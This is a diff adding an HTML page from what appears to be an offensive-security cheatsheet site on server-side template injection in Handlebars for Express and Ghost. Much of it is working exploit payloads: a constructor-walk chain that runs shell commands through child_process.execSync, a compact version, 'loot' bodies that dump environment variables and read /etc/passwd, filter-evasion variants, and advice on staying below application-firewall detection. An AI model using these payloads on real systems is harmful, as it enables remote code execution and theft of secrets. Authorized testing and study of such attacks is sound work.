@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Handlebars (Node - Express, Ghost) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Handlebars (Node - Express, Ghost)</h1><p class="cx-lede">SSTI exploitation in Handlebars - prototype pollution chains, require via NodeJS internals, payloads for Express/Ghost.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.007</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval, RCE</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Handlebars is logic-less by design - no arithmetic, no method calls in templates. RCE requires escaping through helpers, prototype pollution, or the underlying compile mechanism.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm Handlebars (NOT Jinja2/Twig - different arithmetic behavior)
+{{7*7}}                                      # → 7*7 literally (Handlebars doesn&#x27;t do arithmetic)
+{{#each (lookup this &quot;constructor&quot;)}}        # error or unusual output if Handlebars
+
+# RCE - constructor walk (Handlebars &lt;= 4.0.13)
+{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre></figure>
+<p>Success indicator: <code>uid=</code> line in output. The payload form is uglier than other engines because Handlebars deliberately doesn't expose method-call syntax.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>Express.js</strong> - Handlebars (via <code>hbs</code> or <code>express-handlebars</code> package) is one of Express's main view engines.</li>
+<li><strong>Ghost CMS</strong> - Themes are Handlebars. SSTI in admin theme upload features is the classic path.</li>
+<li><strong>Slack message templates</strong> - some legacy Slack-bot frameworks use Handlebars for outbound message formatting.</li>
+<li><strong>AWS Lambda</strong> - Handlebars-rendered email templates in SES configurations.</li>
+<li><strong>Custom Node apps</strong> - anything <code>require('handlebars').compile(user_input)</code>.</li>
+</ul>
+<h2 id="step-1-confirm-and-orient">Step 1 - Confirm and orient</h2>
+<p>Handlebars's logic-less design means arithmetic probes don't work the way they do elsewhere:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*7}}                          # → 7*7 literally (NOT 49)
+{{#if true}}YES{{/if}}           # → YES        confirms control flow works
+{{#each [1,2,3]}}{{this}}{{/each}}  # → 123 if Handlebars</code></pre></figure>
+<p><code>{{#if}}</code> and <code>{{#each}}</code> are the diagnostic - <code>{{7*7}}</code> failing to evaluate is a fingerprint for Handlebars, not evidence the engine is absent.</p>
+<p>If <code>{{#if true}}YES{{/if}}</code> returns <code>YES</code>, you have Handlebars and can probe escape paths.</p>
+<h2 id="step-2-constructor-walk-handlebars-4013">Step 2 - Constructor walk (Handlebars ≤ 4.0.13)</h2>
+<p>The original Handlebars SSTI from 2015 used the <code>{{#with}}</code> block helper to walk JavaScript prototype chains. Patched in 4.0.14 (Aug 2017) and again in 4.7.7 for related issues, but unpatched deployments are still common - especially in legacy enterprise apps and embedded Node services.</p>
+<p>Full payload form in the TL;DR above. Compact version (when whitespace doesn't matter):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{#with &quot;s&quot; as |string|}}{{#with &quot;e&quot;}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub &quot;constructor&quot;)}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push &quot;return require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}</code></pre></figure>
+<p>Replace <code>'id'</code> with any command. The payload returns the stdout of <code>execSync</code> directly into the template output.</p>
+<h2 id="step-3-lookup-helper-abuse">Step 3 - <code>lookup</code> helper abuse</h2>
+<p>Handlebars's built-in <code>lookup</code> helper accesses properties dynamically. Combined with constructor access, it reaches <code>Function</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{lookup (lookup this &quot;constructor&quot;) &quot;constructor&quot;}}</code></pre></figure>
+<p>This reaches the <code>Function</code> constructor - calling <code>Function("body")()</code> is equivalent to <code>eval</code>. The exact escape requires combining <code>lookup</code> with <code>#with</code> (as above) since Handlebars doesn't have direct function-call syntax in expressions.</p>
+<h2 id="step-4-helper-registration-abuse">Step 4 - Helper-registration abuse</h2>
+<p>If the application allows custom helper registration through user input (rare but devastating when present), the helper itself executes Node.js:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// Vulnerable pattern in app code
+Handlebars.registerHelper(userInput, function() {
+  return eval(userBody);
+});</code></pre></figure>
+<p>The Handlebars-side payload is just the helper name in a normal expression - the application's evaluation of the helper body is where the bug lives.</p>
+<h2 id="step-5-loot">Step 5 - Loot</h2>
+<p>Handlebars doesn't expose application config directly. Loot comes through the RCE path:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// After RCE via constructor walk, the payload body can be:
+return JSON.stringify(process.env);                           // env vars
+return require(&#x27;fs&#x27;).readFileSync(&#x27;/etc/passwd&#x27;,&#x27;utf8&#x27;);      // file read
+return Object.keys(global);                                    // global Node namespace
+return require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString();    // command output</code></pre></figure>
+<p>Embed any of those in the <code>"return ..."</code> slot of the constructor-walk payload.</p>
+<h2 id="step-6-ghost-cms-specifics">Step 6 - Ghost CMS specifics</h2>
+<p>Ghost themes are Handlebars <code>.hbs</code> files. SSTI in Ghost typically requires admin access to upload a malicious theme - at which point you also have access to the admin API directly, so SSTI is somewhat redundant.</p>
+<p>Where Ghost SSTI is operationally useful: bypassing IP allowlists on admin endpoints. If you reach the theme upload but can't make admin API calls, a malicious <code>.hbs</code> file with the constructor-walk payload gives you Node-side command execution that the admin API alone wouldn't.</p>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Constructor access via dot vs bracket
+{{lookup this &quot;__proto__&quot;}}                  # walk prototype chain
+
+# Whitespace insertion (Handlebars is whitespace-tolerant inside helpers)
+{{#with &quot;s&quot;  as  |string|}}                  # extra spaces survive</code></pre></figure>
+<p>Most Handlebars SSTI mitigations focus on patching the constructor-walk path. Filter-based mitigations are less common because Handlebars's logic-less design already restricts most things.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{#if true}}YES{{/if}}                       # confirms Handlebars (returns YES)
+{{#each [1,2,3]}}{{this}}{{/each}}           # confirms Handlebars (returns 123)
+{{lookup this &quot;constructor&quot;}}                # returns function repr if constructor walk reachable
+{{#with &quot;s&quot; as |x|}}{{x.length}}{{/with}}    # returns 1 - proves `as |x|` syntax works</code></pre></figure>
+<p><code>{{#with "s" as |x|}}{{x.length}}{{/with}}</code> returning <code>1</code> is the cleanest indicator that the constructor-walk path will likely work - that syntax was added in Handlebars 3.x and is required for the escape.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Handlebars 4.7.7+</strong> patches the known constructor-walk paths. Unpatched 4.0.x-4.6.x and all 3.x versions are vulnerable.</li>
+<li><strong><code>noEscape: true</code></strong> is a Handlebars option that disables HTML escaping. It doesn't enable RCE on its own but combined with reflective sinks it creates XSS in addition to SSTI.</li>
+<li><strong>Strict mode</strong> (<code>strict: true</code>) makes references to missing variables throw instead of returning empty. This breaks some payload variants but not the constructor walk.</li>
+<li><strong>Mustache vs Handlebars</strong> - Mustache is the spec Handlebars extends. Pure Mustache (e.g. <code>mustache.js</code>) is even more restrictive and doesn't have the <code>#with</code> syntax - Mustache-only sinks are usually safe from this attack.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>The constructor-walk payload is loud - it's a well-known signature that triggers most Node.js application firewalls. If discretion matters, restrict to detection probes (<code>{{#if true}}YES{{/if}}</code>) until you confirm there's no WAF in front of the application.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../../ssrf/cheatsheet/index.html">Previous: Cheatsheet</a><a class="cx-next" href="../razor/index.html">Next: Razor (.NET - ASP.NET, ASP.NET Core)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
